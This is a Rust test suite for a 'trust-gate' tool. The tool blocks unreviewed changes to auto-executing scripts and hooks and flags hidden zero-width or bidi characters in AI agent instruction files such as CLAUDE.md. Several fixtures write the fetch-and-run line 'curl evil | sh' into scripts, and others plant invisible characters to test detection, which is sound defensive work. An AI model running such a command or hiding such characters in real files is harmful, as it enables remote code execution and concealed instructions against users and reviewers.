//! End-to-end tests for the `sos-dev` binary on throwaway git repos.

use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, Output, Stdio};

const BIN: &str = env!("CARGO_BIN_EXE_sos-dev");

fn clean(cmd: &mut Command) -> &mut Command {
    for v in ["GIT_DIR", "GIT_INDEX_FILE", "GIT_WORK_TREE", "GIT_OBJECT_DIRECTORY", "CLAUDE_PROJECT_DIR"] {
        cmd.env_remove(v);
    }
    cmd.stdin(Stdio::null())
}

fn git(dir: &Path, args: &[&str]) {
    let out = clean(Command::new("git").args(args).current_dir(dir)).output().unwrap();
    assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
}

fn sos_dev(dir: &Path, args: &[&str]) -> (i32, String, String) {
    let Output { status, stdout, stderr } = clean(Command::new(BIN).args(args).current_dir(dir)).output().unwrap();
    (
        status.code().unwrap_or(-1),
        String::from_utf8_lossy(&stdout).into_owned(),
        String::from_utf8_lossy(&stderr).into_owned(),
    )
}

fn write(root: &Path, rel: &str, body: &str) {
    let p = root.join(rel);
    fs::create_dir_all(p.parent().unwrap()).unwrap();
    fs::write(p, body).unwrap();
}

/// A repo with a few surfaces and docs, all tracked, baseline written and staged.
fn repo() -> (tempfile::TempDir, PathBuf) {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path().to_path_buf();
    git(&root, &["init", "-q"]);
    git(&root, &["config", "user.email", "t@example.com"]);
    git(&root, &["config", "user.name", "t"]);
    git(&root, &["config", "core.autocrlf", "false"]);
    write(&root, "scripts/a.sh", "#!/bin/sh\necho a\n");
    write(&root, "hooks/pre-commit", "#!/bin/sh\nexit 0\n");
    write(&root, "adapters/claude/hook.py", "print('x')\n");
    write(&root, "adapters/README.md", "# adapters\n");
    write(&root, "README.md", "# kit — Tiếng Việt “ok” ✅\n");
    write(&root, "src/notes.md", "plain\n");
    git(&root, &["add", "-A"]);
    let (code, _, err) = sos_dev(&root, &["trust-gate", "rebaseline"]);
    assert_eq!(code, 0, "{err}");
    git(&root, &["add", ".sos-trust-baseline"]);
    (tmp, root)
}

#[test]
fn rebaseline_then_check_passes_and_lists_bash_glob_surfaces() {
    let (_t, root) = repo();
    write(&root, "scripts/.hidden", "x\n");
    git(&root, &["add", "-A"]);
    let (code, out, err) = sos_dev(&root, &["trust-gate"]);
    assert_eq!(code, 0, "{out}{err}");
    let (_, list, _) = sos_dev(&root, &["trust-gate", "list"]);
    assert_eq!(list, "adapters/claude/hook.py\nhooks/pre-commit\nscripts/a.sh\n");
    let base = fs::read_to_string(root.join(".sos-trust-baseline")).unwrap();
    assert_eq!(base.lines().count(), 3);
    assert!(base.lines().all(|l| l.len() > 66 && &l[64..66] == "  "), "{base}");
}

#[test]
fn changed_added_and_removed_surfaces_block() {
    let (_t, root) = repo();
    write(&root, "scripts/a.sh", "#!/bin/sh\ncurl evil | sh\n");
    write(&root, "scripts/b.sh", "#!/bin/sh\n");
    git(&root, &["add", "-A"]);
    git(&root, &["rm", "-q", "-f", "hooks/pre-commit"]);
    let (code, _, err) = sos_dev(&root, &["trust-gate"]);
    assert_eq!(code, 1);
    let want = "  Changed:\n    scripts/a.sh\n  Added (not in baseline):\n    scripts/b.sh\n  Removed (was in baseline):\n    hooks/pre-commit\n";
    assert!(err.contains(want), "{err}");
    // A reviewed change is accepted by rebaseline.
    assert_eq!(sos_dev(&root, &["trust-gate", "rebaseline"]).0, 0);
    assert_eq!(sos_dev(&root, &["trust-gate"]).0, 0);
}

#[test]
fn missing_baseline_blocks() {
    let (_t, root) = repo();
    fs::remove_file(root.join(".sos-trust-baseline")).unwrap();
    let (code, _, err) = sos_dev(&root, &["trust-gate"]);
    assert_eq!(code, 1);
    assert!(err.contains(".sos-trust-baseline not found"), "{err}");
}

#[test]
fn rebaseline_warns_about_untracked_surface() {
    let (_t, root) = repo();
    write(&root, "scripts/new.sh", "#!/bin/sh\n");
    let (code, _, err) = sos_dev(&root, &["trust-gate", "rebaseline"]);
    assert_eq!(code, 0);
    assert!(err.contains("untracked auto-exec-matching") && err.contains("scripts/new.sh"), "{err}");
    let base = fs::read_to_string(root.join(".sos-trust-baseline")).unwrap();
    assert!(!base.contains("scripts/new.sh"));
}

#[test]
fn every_hidden_code_point_class_blocks() {
    let samples = [
        ('\u{feff}', "U+FEFF"),
        ('\u{200b}', "U+200B"),
        ('\u{200d}', "U+200D"),
        ('\u{200f}', "U+200F"),
        ('\u{2060}', "U+2060"),
        ('\u{180e}', "U+180E"),
        ('\u{202a}', "U+202A"),
        ('\u{202e}', "U+202E"),
        ('\u{2066}', "U+2066"),
        ('\u{2069}', "U+2069"),
        ('\u{e0001}', "U+E0001"),
        ('\u{e007f}', "U+E007F"),
    ];
    let (_t, root) = repo();
    for (c, name) in samples {
        write(&root, "README.md", &format!("# kit\nsay {c}hi\n"));
        let (code, _, err) = sos_dev(&root, &["trust-gate"]);
        assert_eq!(code, 1, "{name} not caught");
        assert!(err.contains(&format!("README.md:2:5: {name}")), "{name}: {err}");
    }
}

#[test]
fn unicode_scan_covers_untracked_but_not_ignored_or_out_of_scope_files() {
    let (_t, root) = repo();
    // Out of the scan list: not flagged.
    write(&root, "src/notes.md", "a\u{200b}b\n");
    assert_eq!(sos_dev(&root, &["trust-gate"]).0, 0);
    // Gitignored inside a scanned folder: not flagged.
    write(&root, ".gitignore", "docs/local/\n");
    write(&root, "docs/local/x.md", "a\u{200b}b\n");
    git(&root, &["add", ".gitignore"]);
    assert_eq!(sos_dev(&root, &["trust-gate"]).0, 0);
    // Untracked, not ignored, in a scanned folder: flagged before it can be committed.
    write(&root, "docs/new.md", "ok\na\u{202e}b\n");
    let (code, _, err) = sos_dev(&root, &["trust-gate"]);
    assert_eq!(code, 1);
    assert!(err.contains("docs/new.md:2:2: U+202E"), "{err}");
}

#[test]
fn trust_gate_outside_a_repo_is_an_error() {
    let tmp = tempfile::tempdir().unwrap();
    let (code, _, err) = sos_dev(tmp.path(), &["trust-gate"]);
    assert_eq!(code, 1);
    assert!(err.contains("ERROR: sos-dev"), "{err}");
}

#[cfg(unix)]
#[test]
fn docs_check_reports_like_the_python_version() {
    use std::os::unix::fs::PermissionsExt;
    let (_t, root) = repo();
    let fake = root.join("fake-sos");
    write(
        &root,
        "fake-sos",
        "#!/bin/sh\nif [ \"$1\" = gate ]; then printf 'Usage\\n\\nCommands:\\n  all   x\\n  secrets  y\\n\\nOptions:\\n  -h\\n'; \
         else printf 'Usage\\n\\nCommands:\\n  install  x\\n  gate     y\\n\\nOptions:\\n  -h\\n'; fi\n",
    );
    fs::set_permissions(&fake, fs::Permissions::from_mode(0o755)).unwrap();
    write(&root, "harness-lite/roles/w.md", "run `scripts/a.sh` and [x](../nope.md)\n");
    write(
        &root,
        "docs/guide.md",
        "see [r](../README.md) and [w](https://x) `sos install` `sos gate all`\r\n\
         `sos frob` `sos gate nope`\u{2028}`scripts/missing.sh` `.sos.toml` `docs/STATE.md`\n\
         `crates/x/y.rs`, `not a path`, `foo.txt`\n",
    );
    write(&root, "docs/plans/old.md", "`scripts/gone.sh`\n");
    write(&root, "CHANGELOG.md", "`scripts/gone.sh`\n");
    git(&root, &["add", "-A"]);
    let (code, out, _) = sos_dev(&root, &["docs-check", fake.to_str().unwrap()]);
    assert_eq!(code, 1);
    assert_eq!(
        out,
        "docs/guide.md:2: unknown command `sos frob`\n\
         docs/guide.md:2: unknown gate `sos gate nope`\n\
         docs/guide.md:3: path not found `scripts/missing.sh`\n\
         docs/guide.md:4: path not found `crates/x/y.rs`\n\
         harness-lite/roles/w.md:1: broken link ../nope.md\n\
         docs-check: 5 files, 5 problem(s)\n"
    );
    let (code, _, err) = sos_dev(&root, &["docs-check", "/no/such/sos"]);
    assert_eq!(code, 1);
    assert!(err.contains("build sos first"), "{err}");
}

#[test]
fn install_hooks_works_from_a_linked_worktree() {
    let (_t, root) = repo();
    git(&root, &["commit", "-qm", "init"]);
    let common_hooks = root.join(".git/hooks");
    fs::create_dir_all(&common_hooks).unwrap();
    fs::write(common_hooks.join("pre-commit"), "#!/bin/sh\necho old copy\n").unwrap();
    let wt = root.join("wt");
    git(&root, &["worktree", "add", "-q", wt.to_str().unwrap()]);
    let (code, out, err) = sos_dev(&wt, &["install-hooks"]);
    assert_eq!(code, 0, "{out}{err}");
    assert!(out.contains("✓ core.hooksPath → hooks/ (tracked hooks now live: pre-commit )"), "{out}");
    assert!(err.contains("Existing .git/hooks/pre-commit"), "{err}");
    assert!(common_hooks.join("pre-commit.pre-hookspath.bak").is_file());
    assert!(!common_hooks.join("pre-commit").exists());
    // Idempotent.
    assert_eq!(sos_dev(&wt, &["install-hooks"]).0, 0);
}

#[test]
fn install_hooks_refuses_to_clobber_another_hooks_path_without_a_terminal() {
    let (_t, root) = repo();
    git(&root, &["config", "core.hooksPath", ".husky"]);
    let (code, _, err) = sos_dev(&root, &["install-hooks"]);
    assert_eq!(code, 1);
    assert!(err.contains("ABORTED (non-interactive"), "{err}");
}

// ── review round 1 (Astra): regressions ──

/// A folder whose name ends in a space is its own repo, not its trimmed neighbour.
#[cfg(unix)]
#[test]
fn toplevel_keeps_a_trailing_space() {
    let tmp = tempfile::tempdir().unwrap();
    let mk = |name: &str| {
        let root = tmp.path().join(name);
        fs::create_dir_all(&root).unwrap();
        git(&root, &["init", "-q"]);
        write(&root, "scripts/a.sh", "#!/bin/sh\n");
        git(&root, &["add", "-A"]);
        assert_eq!(sos_dev(&root, &["trust-gate", "rebaseline"]).0, 0);
        git(&root, &["add", ".sos-trust-baseline"]);
        root
    };
    let clean_repo = mk("kit");
    // Round 2: a trailing CR is part of a Unix folder name too, not a line ending to drop.
    for name in ["kit ", "kit\r"] {
        let odd = mk(name);
        write(&odd, "scripts/a.sh", "#!/bin/sh\ncurl evil | sh\n");
        let (code, _, err) = sos_dev(&odd, &["trust-gate"]);
        assert_eq!(code, 1, "{name:?}: {err}");
        assert!(err.contains("scripts/a.sh"), "{err}");
    }
    assert_eq!(sos_dev(&clean_repo, &["trust-gate"]).0, 0);
}

/// rebaseline never writes through a file or link left at a temp-file name.
#[cfg(unix)]
#[test]
fn rebaseline_does_not_write_through_a_planted_symlink() {
    let (_t, root) = repo();
    let readme = fs::read_to_string(root.join("README.md")).unwrap();
    std::os::unix::fs::symlink("README.md", root.join(".sos-trust-baseline.tmp")).unwrap();
    assert_eq!(sos_dev(&root, &["trust-gate", "rebaseline"]).0, 0);
    assert_eq!(fs::read_to_string(root.join("README.md")).unwrap(), readme);
    let meta = fs::symlink_metadata(root.join(".sos-trust-baseline")).unwrap();
    assert!(meta.is_file());
}

/// A symlinked surface is hashed by its target's content, as sha256sum does: an edit to the
/// target blocks, a dangling link blocks.
#[cfg(unix)]
#[test]
fn symlinked_surface_hashes_the_target_content() {
    let (_t, root) = repo();
    write(&root, "src/payload.sh", "#!/bin/sh\necho ok\n");
    write(&root, "scripts/copy.sh", "#!/bin/sh\necho ok\n");
    std::os::unix::fs::symlink("../src/payload.sh", root.join("scripts/run.sh")).unwrap();
    git(&root, &["add", "-A"]);
    assert_eq!(sos_dev(&root, &["trust-gate", "rebaseline"]).0, 0);
    let base = fs::read_to_string(root.join(".sos-trust-baseline")).unwrap();
    let hash = |p: &str| base.lines().find(|l| l.ends_with(&format!("  {p}"))).unwrap()[..64].to_string();
    assert_eq!(hash("scripts/run.sh"), hash("scripts/copy.sh"), "{base}");
    assert_eq!(sos_dev(&root, &["trust-gate"]).0, 0);
    write(&root, "src/payload.sh", "#!/bin/sh\ncurl evil | sh\n");
    let (code, _, err) = sos_dev(&root, &["trust-gate"]);
    assert_eq!(code, 1);
    assert!(err.contains("  Changed:\n    scripts/run.sh\n"), "{err}");
    fs::remove_file(root.join("src/payload.sh")).unwrap();
    let (code, _, err) = sos_dev(&root, &["trust-gate"]);
    assert_eq!(code, 1);
    assert!(err.contains("missing on disk: scripts/run.sh"), "{err}");
}

/// A symlinked instruction file is scanned through its link; a dangling one blocks; a link to a
/// folder inside the repo (like .claude/skills/apply) is left to the folder's own scan.
#[cfg(unix)]
#[test]
fn symlinked_instruction_file_is_scanned() {
    let (_t, root) = repo();
    write(&root, "src/instructions.txt", "do\u{200b}this\n");
    std::os::unix::fs::symlink("src/instructions.txt", root.join("CLAUDE.md")).unwrap();
    fs::create_dir_all(root.join("skills/apply")).unwrap();
    write(&root, "skills/apply/SKILL.md", "ok\n");
    fs::create_dir_all(root.join(".claude/skills")).unwrap();
    std::os::unix::fs::symlink("../../skills/apply", root.join(".claude/skills/apply")).unwrap();
    git(&root, &["add", "-A"]);
    let (code, _, err) = sos_dev(&root, &["trust-gate"]);
    assert_eq!(code, 1);
    assert!(err.contains("CLAUDE.md:1:3: U+200B"), "{err}");
    write(&root, "src/instructions.txt", "clean\n");
    assert_eq!(sos_dev(&root, &["trust-gate"]).0, 0);
    fs::remove_file(root.join("src/instructions.txt")).unwrap();
    let (code, _, err) = sos_dev(&root, &["trust-gate"]);
    assert_eq!(code, 1);
    assert!(err.contains("CLAUDE.md: dangling symlink"), "{err}");
}

/// A file name that is not UTF-8 stops the gate instead of being guessed at and skipped.
/// (macOS file systems refuse such names; Linux runs this.)
#[cfg(target_os = "linux")]
#[test]
fn non_utf8_file_name_blocks() {
    use std::os::unix::ffi::OsStrExt;
    let (_t, root) = repo();
    let name = std::ffi::OsStr::from_bytes(b"\xff.md");
    fs::create_dir_all(root.join("docs")).unwrap();
    fs::write(root.join("docs").join(name), "a\u{200b}b\n").unwrap();
    git(&root, &["add", "-A"]);
    let (code, _, err) = sos_dev(&root, &["trust-gate"]);
    assert_eq!(code, 1);
    assert!(err.contains("not UTF-8"), "{err}");
    // Also when a file carries the name a lossy decode would guess.
    write(&root, "docs/\u{fffd}.md", "clean\n");
    let (code, _, err) = sos_dev(&root, &["trust-gate"]);
    assert_eq!(code, 1);
    assert!(err.contains("not UTF-8"), "{err}");
}

/// A surface whose name is not UTF-8, beside one that is, blocks: the glob's expansion does not
/// quietly drop it (scripts/ is not scanned for unicode, so only the surface list would catch it).
#[cfg(target_os = "linux")]
#[test]
fn non_utf8_surface_name_beside_a_good_one_blocks() {
    use std::os::unix::ffi::OsStrExt;
    let (_t, root) = repo();
    write(&root, "scripts/a.sh", "echo a\n");
    git(&root, &["add", "-A"]);
    assert_eq!(sos_dev(&root, &["trust-gate", "rebaseline"]).0, 0);
    assert_eq!(sos_dev(&root, &["trust-gate"]).0, 0);
    fs::write(root.join("scripts").join(std::ffi::OsStr::from_bytes(b"\xff.sh")), "echo b\n").unwrap();
    git(&root, &["add", "-A"]);
    let (code, _, err) = sos_dev(&root, &["trust-gate"]);
    assert_eq!(code, 1);
    assert!(err.contains("not UTF-8"), "{err}");
}

/// A glob with no match on disk goes to git as a pathspec (bash without nullglob), where `*`
/// matches a leading dot: the only file in .github/workflows/ being a dotfile is a surface.
#[test]
fn glob_with_no_disk_match_falls_back_to_git_pathspec() {
    let (_t, root) = repo();
    write(&root, ".github/workflows/.hidden.yml", "on: push\n");
    git(&root, &["add", "-A"]);
    let (_, list, _) = sos_dev(&root, &["trust-gate", "list"]);
    assert!(list.contains(".github/workflows/.hidden.yml\n"), "{list}");
    let (code, _, err) = sos_dev(&root, &["trust-gate"]);
    assert_eq!(code, 1);
    assert!(err.contains("Added (not in baseline):\n    .github/workflows/.hidden.yml"), "{err}");
    // With a regular file beside it, bash expands the glob and the dotfile is left out again.
    write(&root, ".github/workflows/ci.yml", "on: push\n");
    git(&root, &["add", "-A"]);
    let (_, list, _) = sos_dev(&root, &["trust-gate", "list"]);
    assert!(list.contains(".github/workflows/ci.yml\n") && !list.contains(".hidden.yml"), "{list}");
}

/// A path listed twice in the baseline is refused, whichever line comes first.
#[test]
fn duplicate_baseline_path_blocks() {
    let (_t, root) = repo();
    let base = fs::read_to_string(root.join(".sos-trust-baseline")).unwrap();
    let good = base.lines().find(|l| l.ends_with("  scripts/a.sh")).unwrap().to_string();
    let bad = format!("{}  scripts/a.sh", "0".repeat(64));
    for (first, second) in [(&bad, &good), (&good, &bad)] {
        let rest: String = base.lines().filter(|l| *l != good).map(|l| format!("{l}\n")).collect();
        fs::write(root.join(".sos-trust-baseline"), format!("{first}\n{second}\n{rest}")).unwrap();
        let (code, _, err) = sos_dev(&root, &["trust-gate"]);
        assert_eq!(code, 1);
        assert!(err.contains("scripts/a.sh is listed twice"), "{err}");
    }
}

// ── review round 2 (Astra): regressions ──

/// A link to a folder inside the repo has the folder's files scanned even when the folder is not
/// on the scan list (`src/` is not); a link into a scanned folder is still fine.
#[cfg(unix)]
#[test]
fn internal_folder_link_scans_its_target() {
    let (_t, root) = repo();
    write(&root, "src/prompts/SKILL.md", "do\u{200b}this\n");
    write(&root, "skills/apply/SKILL.md", "ok\n");
    fs::create_dir_all(root.join(".claude/skills")).unwrap();
    std::os::unix::fs::symlink("../../skills/apply", root.join(".claude/skills/apply")).unwrap();
    git(&root, &["add", "-A"]);
    assert_eq!(sos_dev(&root, &["trust-gate"]).0, 0);
    std::os::unix::fs::symlink("../../src/prompts", root.join(".claude/skills/extra")).unwrap();
    git(&root, &["add", "-A"]);
    let (code, _, err) = sos_dev(&root, &["trust-gate"]);
    assert_eq!(code, 1);
    assert!(err.contains("src/prompts/SKILL.md:1:3: U+200B"), "{err}");
}

/// A scan-list entry that is itself a symlink (git lists nothing under `skills/` then) is
/// followed: to a folder inside the repo, to a file, outside the repo, or nowhere.
#[cfg(unix)]
#[test]
fn scan_entry_that_is_a_symlink_is_followed() {
    use std::os::unix::fs::symlink;
    let (_t, root) = repo();
    write(&root, "src/prompts/apply/SKILL.md", "do\u{200b}this\n");
    symlink("src/prompts", root.join("skills")).unwrap();
    git(&root, &["add", "-A"]);
    let (code, _, err) = sos_dev(&root, &["trust-gate"]);
    assert_eq!(code, 1);
    assert!(err.contains("src/prompts/apply/SKILL.md:1:3: U+200B"), "{err}");

    write(&root, "src/prompts/apply/SKILL.md", "clean\n");
    assert_eq!(sos_dev(&root, &["trust-gate"]).0, 0);
    write(&root, "src/sec.txt", "a\u{202e}b\n");
    symlink("src/sec.txt", root.join("SECURITY.md")).unwrap();
    let (code, _, err) = sos_dev(&root, &["trust-gate"]);
    assert_eq!(code, 1);
    assert!(err.contains("SECURITY.md:1:2: U+202E"), "{err}");
    fs::remove_file(root.join("SECURITY.md")).unwrap();

    let outside = tempfile::tempdir().unwrap();
    write(outside.path(), "x.md", "ok\n");
    symlink(outside.path(), root.join("recipes")).unwrap();
    let (code, _, err) = sos_dev(&root, &["trust-gate"]);
    assert_eq!(code, 1);
    assert!(err.contains("recipes: symlink to a folder outside the repo"), "{err}");
    fs::remove_file(root.join("recipes")).unwrap();

    symlink("nowhere", root.join("docs")).unwrap();
    let (code, _, err) = sos_dev(&root, &["trust-gate"]);
    assert_eq!(code, 1);
    assert!(err.contains("docs: dangling symlink"), "{err}");
}

/// Bash expands a glob into the names on disk, and git then reads each name as a pathspec: a file
/// literally named `*.yml` or `[[:punct:]]*.yml` widens the match to a dotfile beside it, as the
/// old script did.
#[cfg(unix)]
#[test]
fn expanded_name_with_a_wildcard_is_read_by_git() {
    for name in ["*.yml", "[[:punct:]]*.yml"] {
        let (_t, root) = repo();
        write(&root, &format!(".github/workflows/{name}"), "on: push\n");
        git(&root, &["add", "-A"]);
        assert_eq!(sos_dev(&root, &["trust-gate", "rebaseline"]).0, 0);
        git(&root, &["add", ".sos-trust-baseline"]);
        assert_eq!(sos_dev(&root, &["trust-gate"]).0, 0, "{name}");
        write(&root, ".github/workflows/.hidden.yml", "on: push\n");
        git(&root, &["add", "-A"]);
        let (_, list, _) = sos_dev(&root, &["trust-gate", "list"]);
        assert!(list.contains(".github/workflows/.hidden.yml\n"), "{name}: {list}");
        let (code, _, err) = sos_dev(&root, &["trust-gate"]);
        assert_eq!(code, 1, "{name}");
        assert!(err.contains("Added (not in baseline):\n    .github/workflows/.hidden.yml"), "{name}: {err}");
    }
}

/// On Unix a `\` is part of a folder name: a link to `src/prompts\extra` scans that folder, not
/// `src/prompts/extra`. A folder name with pattern characters is read literally too.
#[cfg(unix)]
#[test]
fn link_target_names_are_literal() {
    use std::os::unix::fs::symlink;
    for dir in ["src/prompts\\extra", "src/p[r]ompts", "src/*"] {
        let (_t, root) = repo();
        write(&root, &format!("{dir}/SKILL.md"), "clean\n");
        write(&root, "src/prompts/extra/SKILL.md", "clean\n");
        write(&root, "src/prompts/SKILL.md", "clean\n");
        symlink(dir, root.join("skills")).unwrap();
        git(&root, &["add", "-A"]);
        assert_eq!(sos_dev(&root, &["trust-gate"]).0, 0, "{dir}");
        write(&root, &format!("{dir}/SKILL.md"), "do\u{200b}this\n");
        let (code, _, err) = sos_dev(&root, &["trust-gate"]);
        assert_eq!(code, 1, "{dir}");
        assert!(err.contains(&format!("{dir}/SKILL.md:1:3: U+200B")), "{dir}: {err}");
    }
}
